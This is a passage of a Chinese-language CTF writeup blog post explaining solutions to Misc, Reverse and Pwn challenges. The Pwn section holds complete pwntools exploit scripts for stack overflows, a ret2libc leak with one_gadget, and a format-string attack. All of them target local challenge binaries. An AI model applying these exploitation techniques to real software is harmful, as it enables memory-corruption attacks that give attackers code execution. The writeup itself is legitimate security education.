+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="武汉加油-中国加油"><a href="#武汉加油-中国加油" class="headerlink" title="武汉加油 中国加油"></a>武汉加油 中国加油</h3><p>签到题，把 flag 复制就可以，送分题。</p>
+<h3 id="Different"><a href="#Different" class="headerlink" title="Different"></a>Different</h3><p>题目说了 Different，那就是找不同，一般是比对十六进制数据，用 Beyond Compare 打开对比，标红差别就行，送分题。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDUG6.png" alt="1RDUG6.png"></p>
+<h3 id="You-are-a-good-man"><a href="#You-are-a-good-man" class="headerlink" title="You are a good man"></a>You are a good man</h3><p>题目信息写了180cm，然后放出hint说很高，那直接把解题思路都说清楚了：改图片高度。我们先右键查看一下它的尺寸</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDDqH.png" alt="1RDDqH.png"></p>
+<p>1125，我们用程序员计算器（Windows自带）将十六进制数计算出来，为 465。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RD6II.png" alt="1RD6II.png"></p>
+<p>然后用 Winhex 打开(其它十六进制编辑器也可以，如010 Editor等)，寻找 04 65的关键字样，注意第二个才是高，将他改高一点即可，如改成1400，转换成十六进制就是 578，即05 78，修改后保存即可（预期解是1313）。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDgit.png" alt="1RDgit.png"></p>
+<p>​    </p>
+<p>这是原图</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg" alt="1RHDOJ.jpg"></p>
+<h3 id="Guess-Where-I-am"><a href="#Guess-Where-I-am" class="headerlink" title="Guess Where I am"></a>Guess Where I am</h3><p>这题灵感来自 C1CTF 的，也算是借鉴了，图片找了一个比较哲学的，虽然跟题目没有任何关系，题目表述为<code>Shakespeare will figure out you should take a guess</code>，一个 <code>out</code> 一个 <code>guess</code>，提示已经很明确是使用工具 <code>outguess</code>了，选择这个出题思路也是发现学校好像没什么接触过这个工具，刚好可以借机让大家知道一下。</p>
+<p>安装工具自行Google即可，不做阐述，工具有了，这题也就是送分题了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用命令</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> outguess -r guess.jpg flag</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> cat flag | base64 -d</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里提取出来的数据是base64编码过，因此需要再解码一下</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDoZj.png" alt="1RDoZj.png"></p>
+<h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>我是做梦没想到这个可以难到一些人，直接填写调查问卷即可拿flag，顺便拿点反馈做个统计，以后好改进，毕竟是Google表单，因此需要挂个梯子，题目也说明了需要科学上网，填好之后就送flag了，送分题。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDTds.png" alt="1RDTds.png"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>在学校主站上也放过，原题，也是bugku中最简单的逆向题，题目也提示了 <code>IDA is a good tool</code>，我们直接拖进 IDA，就可以看到一串比较明显的东西。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RDxL4.png" alt="1RDxL4.png"></p>
+<p>最简单的方法，手动按<code>r</code>，用眼睛看，flag就有了，主要是让大家把IDA装好并简单使用。</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1RHBy4.png" alt="1RHBy4.png"></p>
+<h3 id="junkcode"><a href="#junkcode" class="headerlink" title="junkcode"></a>junkcode</h3><p><img src="https://s2.ax1x.com/2020/02/08/1W9Lh4.png" alt="1W9Lh4.png"></p>
+<p>直接看到我们程序调用的这个地方会发现地址是红色的，没有识别成一个函数，主要是因为IDA是使用的线性扫描法，碰到花指令时就会出现如上情况，这种比较小程序的可以手动去花指令</p>
+<h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9j39.png" alt="1W9j39.png"></p>
+<p>如果我们直接在开始处强行Create function，IDA会报如下错误<code>undefined instruction</code>在<code>text:00000000004007A3</code>，过去看一下</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W9vcR.png" alt="1W9vcR.png"></p>
+<p>很明显中间有一个Byte的指令根本没有用到，我们把它nop（机器码0x90，代表什么也不做）掉</p>
+<p>可以Ctrl+Alt+K使用keypatch，也可以到HEX里面找到对应位置按F2修改成90，效果如下：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W9xj1.png" alt="1W9xj1.png"></p>
+<p>然后在此处按C把数据转成指令</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1WCSnx.png" alt="1WCSnx.png"></p>
+<p>再回来create就发现能成功了：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1WCpB6.png" alt="1WCpB6.png"></p>
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>但是无法f5，会显示</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1WC9HK.png" alt="1WC9HK.png"></p>
+<p>是因为这里还有一个花指令</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1WCPAO.png" alt="1WCPAO.png"></p>
+<p>这个add rsp,64h显然没有任何作用，可是这种指令会干扰IDA分析函数，add rsp一般只出现在函数调用后用来释放参数空间和对齐，直接nop掉这条指令再f5</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1WCiND.png" alt="1WCiND.png"></p>
+<p>接下来就是正常的程序分析了</p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>按 r 将 <code>dest</code> 转成字符形式</p>
+<p><img src="https://s2.ax1x.com/2020/02/09/1fIFU0.png" alt="1fIFU0.png"></p>
+<p>我们跟踪 <code>src</code> 看到为<code>k^a3``7z</code></p>
+<p><img src="https://s2.ax1x.com/2020/02/09/1fIiEq.png" alt="1fIiEq.png"></p>
+<p>写脚本计算出来就可以了，exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">b'wdviO&#123;Uk^a3``7z'</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line">flag2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	flag1 += chr(str[i] - i)</span><br><span class="line">	flag2 += chr(str[i+<span class="number">8</span>] ^ i)</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ python exp.py</span><br><span class="line">wctf&#123;JuNk_c0de1&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>一个基础栈溢出</p>
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9TBV.png" alt="1W9TBV.png"></p>
+<p>这个题本身没有开保护，旨在想让你们先了解一下什么是栈溢出</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W977T.png" alt="1W977T.png"></p>
+<p>首先打印了一个函数地址</p>
+<p>对应的函数如下：</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W94cn.png" alt="1W94cn.png"></p>
+<p>然后write出提示之后通过gets输入造成栈溢出，这里的<code>gets(&amp;v5,&quot;&gt;&quot;)</code>带着一个<code>&quot;&gt;&quot;</code>主要是ida识别的时候会有些问题，这个<code>&quot;&gt;&quot;</code>字符串的地址本来是前一个<code>write</code>函数的第二个参数，这里识别出错就成了gets带着两个参数</p>
+<h4 id="计算偏移量"><a href="#计算偏移量" class="headerlink" title="计算偏移量"></a>计算偏移量</h4><p>既然知道是栈溢出了，首先就要计算偏移量，v5从<code>[rbp-40h]</code>的地方开始，然后<code>[rbp]</code>处还有8个字节，所以构造的payload就应该是’a’*0x40+’b’*0x8+p64(想要劫持到的函数地址)，实现程序流劫持</p>
+<h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>具体exp如下(因为我写exp的时候都是用的一个Demo.py，所以具体的实现过程只用看<code># todo here</code>即可，这里只有两行)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./warmup'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x40</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>后面的题就是想拿给18级做的了，19级能搭起前面这个题的环境还有成功复现就很不错了XD</p>
+<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W95Xq.png" alt="1W95Xq.png"></p>
+<p>开启栈不可执行，没有canary、PIE</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W9h1s.png" alt="1W9h1s.png"></p>
+<p>先输入到<code>buf 0xA</code>字节，然后<code>read(0,&amp;s1,0x100)</code>一个很明显的栈溢出，后面的ok和fail没什么用</p>
+<p>由于只有一次溢出，程序也没有后门，所以我们需要先leak出一个libc的地址，然后漏洞点重复利用，回到main，然后ret2libc</p>
+<h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>先用<code>ROPgadget</code>寻找<code>gadget：pop rdi ret</code></p>
+<p>然后第一次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</code></p>
+<p>利用<code>puts_plt</code>把<code>puts</code>函数的GOT表项打出来，然后回到main</p>
+<p>第二次根据puts函数的地址和固定偏移计算出<code>libc</code>的加载地址，至于这些偏移可以在脚本里面写<code>symbols[&#39;puts&#39;]</code>也可以直接用<code>gdb</code>调试时 ：p puts然后<code>vmmap</code>查看基址，相减得到偏移</p>
+<h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><p>得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面的<code>/bin/sh</code>地址，调用<code>system</code>也行（个人推荐用one_gadget，方便很多）</p>
+<p>第二次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(libc_base+one_gadget_offset)</code></p>
+<h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn1'</span>      <span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary         <span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)    <span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">'your name\n'</span>)</span><br><span class="line">p.send(<span class="string">'Coldshield'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the key?\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi_ret=<span class="number">0x00000000004012ab</span></span><br><span class="line">puts_GOT=<span class="number">0x404018</span></span><br><span class="line">puts_plt=<span class="number">0x401030</span></span><br><span class="line">main=<span class="number">0x401162</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_offset=<span class="number">0x6f690</span></span><br><span class="line">one_gadget_offset=<span class="number">0x45216</span></span><br><span class="line">p.recvuntil(<span class="string">'fail!\n'</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))-puts_offset</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your name\n'</span>)</span><br><span class="line">p.send(<span class="string">'Coldshield'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the key?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(libc_base+one_gadget_offset)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h3><p>这个题是我出的一个题，具体结合了格式化字符串还有栈上变量的覆盖</p>
+<h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9bAU.png" alt="1W9bAU.png"></p>
+<p>没有canary和PIE</p>
+<p><img src="https://s2.ax1x.com/2020/02/08/1W9qNF.png" alt="1W9qNF.png"></p>
+<p><code>read(0,&amp;buf,0x30)</code>很明显能溢出到<code>seed</code>，覆盖其为我们控制的值就可以预测rand()产生的值</p>
+<p>通过随机数检测之后，下面有一个格式化字符串漏洞，是将我们前面用来覆盖<code>seed</code>输入的name打印出来，直接打印栈上任何存在的一个<code>libc</code>地址即可（可以直接看有没有哪个值是属于<code>libc</code>的），但是其中main函数的返回地址固定是<code>___libc_start_main</code>中的偏移，具体见我之前暑假写的ELF执行全流程，所以计算出调用<code>printf</code>时这个返回地址的偏移即可</p>
+<p>payload1(name)：<code>p.send(&#39;%19$p&#39;.ljust(0x28,&#39;a&#39;)+p64(0))</code></p>
+<p>最后一个say something只能使用<code>one_gadget</code>，因为溢出字节只到了返回地址</p>
+<p>payload2：<code>payload=&#39;\x00&#39;*0x50+&#39;b&#39;*8+p64(libc_base+0x45216)</code></p>
+<h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./rand'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40081C")</span></span><br><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'%19$p'</span>.ljust(<span class="number">0x28</span>,<span class="string">'a'</span>)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'rand game\n'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	num=lib.rand() % <span class="number">999</span></span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">'Win\n'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your name is:\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x50</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x45216</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something?\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>suctf playfmt</code>原题，可以自己上网找找wp，至于<code>fopen</code>之后为什么能够这样修改偏移可以改到对应的flag地址，可以了解一下IO file，不过比赛时这种偏移可以直接调试看就好了</p>
+<p>参考：<a href="https://cloud.tencent.com/developer/article/1492955" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1492955</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Donate comment here.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              
+                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              
+                 <a href="/tags/WriteUps/" rel="tag"><i class="fa fa-tag"></i> WriteUps</a>
+              
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/07/14/Web-In-CTF/" rel="prev" title="Web In CTF">
+      <i class="fa fa-chevron-left"></i> Web In CTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/30/wctf2020_official_wp/" rel="next" title="WUST-CTF 2020 官方 Writeup">
+      WUST-CTF 2020 官方 Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web签到题"><span class="nav-number">1.1.</span> <span class="nav-text">Web签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crossover"><span class="nav-number">1.2.</span> <span class="nav-text">Crossover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ezphp"><span class="nav-number">1.3.</span> <span class="nav-text">Ezphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#男人就要快："><span class="nav-number">1.4.</span> <span class="nav-text">男人就要快：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你太闲了"><span class="nav-number">1.5.</span> <span class="nav-text">你太闲了</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#你是猪吗"><span class="nav-number">2.1.</span> <span class="nav-text">你是猪吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#knock-knock"><span class="nav-number">2.2.</span> <span class="nav-text">knock knock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F-k-your-brain"><span class="nav-number">2.3.</span> <span class="nav-text">F**k your brain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#look-at-your-keyboard"><span class="nav-number">2.4.</span> <span class="nav-text">look at your keyboard</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base"><span class="nav-number">2.5.</span> <span class="nav-text">base</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#武汉加油-中国加油"><span class="nav-number">3.1.</span> <span class="nav-text">武汉加油 中国加油</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Different"><span class="nav-number">3.2.</span> <span class="nav-text">Different</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#You-are-a-good-man"><span class="nav-number">3.3.</span> <span class="nav-text">You are a good man</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-Where-I-am"><span class="nav-number">3.4.</span> <span class="nav-text">Guess Where I am</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调查问卷"><span class="nav-number">3.5.</span> <span class="nav-text">调查问卷</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">4.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyRe"><span class="nav-number">4.1.</span> <span class="nav-text">EasyRe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#junkcode"><span class="nav-number">4.2.</span> <span class="nav-text">junkcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#step-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#step2"><span class="nav-number">4.2.2.</span> <span class="nav-text">step2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit"><span class="nav-number">4.2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 